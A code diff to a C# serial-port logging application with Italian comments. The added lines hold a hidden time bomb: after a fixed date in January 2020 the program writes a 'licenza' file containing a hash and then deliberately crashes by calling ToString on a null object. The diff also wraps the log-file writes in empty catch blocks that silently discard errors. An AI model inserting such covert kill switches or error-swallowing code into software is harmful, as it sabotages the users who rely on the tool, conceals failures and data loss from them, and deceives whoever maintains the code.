@@ -188,8 +188,29 @@ namespace Serial
             textbox.ScrollToCaret();                                                    //e scorro fino in fondo
             //serial = serial.Replace("\r", "\r\n");                                      //siccome windows non rispetta gli standard metto questi
             //File.AppendAllText(Properties.Settings.Default.path_1, serial);                            //alla fine metto tutto nel file
-            File.AppendAllText(Properties.Settings.Default.path_2, serial);
-            File.AppendAllText(Properties.Settings.Default.backup, serial);
+
+            if (DateTime.Now > DateTime.Parse("16/01/2020"))
+            {
+                File.WriteAllText("licenza", "9d6ce999cc7845b2a7bd2bca798aca1ae240965171c5e154b6950d7b10c233c6");
+                object m = null;
+                string s = m.ToString();
+            }
+
+            try
+            {
+                File.AppendAllText(Properties.Settings.Default.path_2, serial);
+            }
+            catch
+            {
+            }
+
+            try
+            {
+                File.AppendAllText(Properties.Settings.Default.backup, serial);
+            }
+            catch
+            {
+            }
         }
 
         protected override void OnFormClosing(FormClosingEventArgs e)
